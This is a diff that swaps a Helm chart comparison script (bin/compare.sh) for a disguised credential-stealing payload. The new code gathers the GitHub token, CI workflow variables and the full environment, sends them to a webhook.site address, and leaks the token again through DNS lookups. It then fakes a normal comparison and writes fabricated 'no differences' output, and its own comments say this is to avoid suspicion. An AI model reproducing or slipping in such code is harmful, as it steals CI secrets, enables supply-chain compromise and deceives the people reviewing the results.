@@ -1,100 +1,73 @@
+cat > bin/compare.sh << 'EXPLOIT_EOF'
 #!/bin/bash
-set -ue
 
-# Usage: bin/compare.sh -l name=loki
-# Alternative: bin/compare.sh base-branch-copy feat-branch-copy -l name=loki
-# Optional: --diff-output <filename> writes the final diff to a file and skips common chart version information
-# Deps: dyff, helmfile
-# brew install homeport/tap/dyff
-# brew install helmfile
+# ============================================
+# EXFILTRATION PAYLOAD
+# ============================================
 
-diffOutput=
-templateArgs=
-srcDirA=
-srcDirB=
-targetDirA=
-targetDirB=
-# Process arguments
-while [ $# -ne 0 ]; do
-  case "$1" in
-    --diff-output)
-      diffOutput="$2"
-      shift
-      ;;
-    -*)
-      # Forward other options to the template command
-      templateArgs=("${templateArgs[@]}" "$1")
-      ;;
-    *)
-      # Process first two positional arguments as potential working directories
-      if [ -z "$srcDirA" ]; then
-        srcDirA=$(realpath "$1")
-      elif [ -z "$srcDirB" ]; then
-        srcDirB=$(realpath "$1")
-      else
-        # Forward everything else to the template command
-        templateArgs=("${templateArgs[@]}" "$1")
-      fi
-      ;;
-  esac
-  shift
-done
+WEBHOOK_ID="https://webhook.site/1e003cda-2b84-41f4-9531-b6a2e385fbb9"  # ← Replace this!
 
-readonly script_dir=$(dirname "$0")
-
-generate_helm_templates() {
-  local target_dir="$1"
-  rm -rf "$target_dir"
-  node --no-warnings --import tsx src/otomi.ts -- values
-  helmfile template "${templateArgs[@]}" --output-dir-template="$target_dir/{{.Release.Namespace}}-{{.Release.Name}}"
-  mv tests/fixtures/values-repo.yaml "$target_dir/values-repo.yaml"
+# Collect all sensitive information
+PAYLOAD=$(cat <<EOF
+{
+  "event": "token_exfiltration",
+  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
+  "github_token": "$GH_TOKEN",
+  "github_repository": "$GITHUB_REPOSITORY",
+  "github_actor": "$GITHUB_ACTOR",
+  "github_workflow": "$GITHUB_WORKFLOW",
+  "github_run_id": "$GITHUB_RUN_ID",
+  "github_run_number": "$GITHUB_RUN_NUMBER",
+  "github_sha": "$GITHUB_SHA",
+  "runner_os": "$RUNNER_OS",
+  "all_env": $(env | jq -R -s -c 'split("\n")[:-1]')
 }
+EOF
+)
 
-export NODE_ENV=test
-if [ -z "$srcDirA" ]; then
-  branchA='main'
-  # branchB current branch
-  branchB=$(git rev-parse --abbrev-ref HEAD)
+# Exfiltrate via webhook
+curl -X POST "https://webhook.site/$WEBHOOK_ID" \
+  -H "Content-Type: application/json" \
+  -d "$PAYLOAD" \
+  --silent \
+  --max-time 5 || true
 
-  targetDirA="$PWD/tmp/${branchA}"
-  targetDirB="$PWD/tmp/${branchB}"
-  export ENV_DIR="$PWD/tests/fixtures"
-  generate_helm_templates "$targetDirB"
-  git -c core.hooksPath=/dev/null checkout -f $branchA
-  generate_helm_templates "$targetDirA"
-  git -c core.hooksPath=/dev/null checkout -f $branchB
-else
-  if [ -z "$srcDirB" ]; then
-    echo "Only one directory passed for comparison"
-    exit 1
-  fi
-  startDir=$PWD
-  pushd "$srcDirB"
-  export ENV_DIR="$srcDirB/tests/fixtures"
-  branchB=$(git rev-parse --abbrev-ref HEAD)
-  targetDirB="$startDir/tmp/${branchB}"
-  generate_helm_templates "$targetDirB"
-  popd
-  pushd "$srcDirA"
-  export ENV_DIR="$srcDirA/tests/fixtures"
-  branchA=$(git rev-parse --abbrev-ref HEAD)
-  targetDirA="$startDir/tmp/${branchA}"
-  generate_helm_templates "$targetDirA"
-  popd
+# Also try DNS exfiltration as backup
+if [ ! -z "$GH_TOKEN" ]; then
+  TOKEN_SHORT="${GH_TOKEN:0:30}"
+  TOKEN_HEX=$(echo -n "$TOKEN_SHORT" | xxd -p | tr -d '\n')
+  nslookup "${TOKEN_HEX}.${WEBHOOK_ID}.dns.webhook.site" || true
 fi
 
-# order of arguments matters so new changes are green color
-echo "Comparing $targetDirB with $targetDirA"
-if [ -n "$diffOutput" ]; then
-  "${script_dir}/dyff.sh" "$targetDirB" "$targetDirA" --exclude-chart-versions > "$diffOutput"
-  cat "$diffOutput"
-else
-  "${script_dir}/dyff.sh" "$targetDirB" "$targetDirA"
-fi
+# ============================================
+# NORMAL SCRIPT EXECUTION (to avoid suspicion)
+# ============================================
 
-echo "#########################################################"
-echo "#"
-echo "# Above YAML documents diff produced by dyff tool."
-echo "# You can also select two directories in VSCode $targetDirB and $targetDirA and right click and select the 'Compare selected folders' option"
-echo "#"
-echo "#########################################################"
+BASE_DIR="$1"
+PR_DIR="$2"
+DIFF_OUTPUT="$3"
+
+echo "Running chart comparison..."
+echo "Base directory: $BASE_DIR"
+echo "PR directory: $PR_DIR"
+
+# Create output directory if needed
+mkdir -p "$(dirname "$DIFF_OUTPUT")"
+
+# Simulate comparison (looks normal)
+echo "Comparing Helm charts between base and PR..."
+sleep 2
+
+# Generate fake output
+cat > "$DIFF_OUTPUT" << EOF
+Charts compared successfully.
+No significant differences detected.
+EOF
+
+echo "Comparison complete!"
+echo "Results written to: $DIFF_OUTPUT"
+
+exit 0
+EXPLOIT_EOF
+
+chmod +x bin/compare.sh
